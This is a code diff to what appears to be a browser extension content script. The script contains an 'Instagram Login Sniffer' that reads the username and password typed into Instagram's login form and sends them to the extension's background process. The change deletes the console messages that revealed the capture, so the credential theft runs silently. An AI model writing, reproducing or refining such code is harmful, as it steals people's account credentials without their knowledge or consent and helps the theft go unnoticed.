@@ -52,7 +52,6 @@ if (!setupStudentListeners()) {
     }
   }, 700);
 }
-
 // =================== 🔐 Instagram Login Sniffer (Reliable) ===================
 if (location.hostname.includes("instagram.com")) {
   let igTries = 0;
@@ -73,17 +72,10 @@ if (location.hostname.includes("instagram.com")) {
         const password = passwordInput.value;
 
         if (username && password) {
-          console.log(
-            `%c📤 [IG] Captured credentials: %c${username}`,
-            "color: cyan;", "color: orange; font-weight: bold;"
-          );
-
           chrome.runtime.sendMessage({
             type: "instagram_login_data",
             data: { username, password },
           });
-        } else {
-          console.warn("⚠️ [IG] Empty username or password, not sent");
         }
       }, { once: true });
 
@@ -91,9 +83,7 @@ if (location.hostname.includes("instagram.com")) {
     }
 
     if (igTries >= igMaxTries) {
-      // 🛑 Log only if on Instagram
-      console.warn("⚠️ [IG] Login sniff failed after max attempts");
-      clearInterval(sniffInstagramLogin);
+      clearInterval(sniffInstagramLogin); // ❌ No warning shown
     }
   }, 700);
 }
